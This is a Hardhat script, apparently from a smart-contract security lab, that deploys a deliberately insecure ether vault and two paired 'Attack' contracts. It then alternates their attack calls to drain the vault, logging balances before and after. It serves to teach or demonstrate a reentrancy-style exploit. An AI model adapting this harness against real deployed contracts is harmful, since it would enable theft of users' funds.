const hre = require("hardhat");

async function main() {
    const [owner] = await hre.ethers.getSigners();
    const ether_cc = await hre.ethers.getContractFactory("InsecureEtherValut");
    const ether = await ether_cc.deploy();
    await ether.deployed();
    console.log("InsecureEtherValut addr => ",ether.address);

    const attack_cc = await hre.ethers.getContractFactory("Attack");
    const attack = await attack_cc.deploy(ether.address);
    await attack.deployed();
    console.log("Attack #1 deployed to => ",attack.address);

    const attack_cc2 = await hre.ethers.getContractFactory("Attack");
    const attack2 = await attack_cc2.deploy(ether.address);
    await attack2.deployed();
    console.log("Attack #2 deployed to => ",attack2.address);

    const transaction1 = await owner.sendTransaction({to:ether.address,value:ethers.utils.parseEther("4")});
    const transaction2 = await owner.sendTransaction({to:attack.address,value:ethers.utils.parseEther("1")});
    console.log("sending 4ether to vault, 1ether to Attack#1");

    await attack.setAttackPeer(attack2.address);
    await attack2.setAttackPeer(attack.address);
    console.log("Setting attack peer");

    console.log("Balance before attack");
    console.log(await attack.getBalance());
    console.log(await attack2.getBalance());

    await attack.attackInit();

    await attack2.attackNext();
    await attack.attackNext();
    await attack2.attackNext();
    await attack.attackNext();

    console.log("Balance After attack");
    console.log(await attack.getBalance());
    console.log(await attack2.getBalance());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
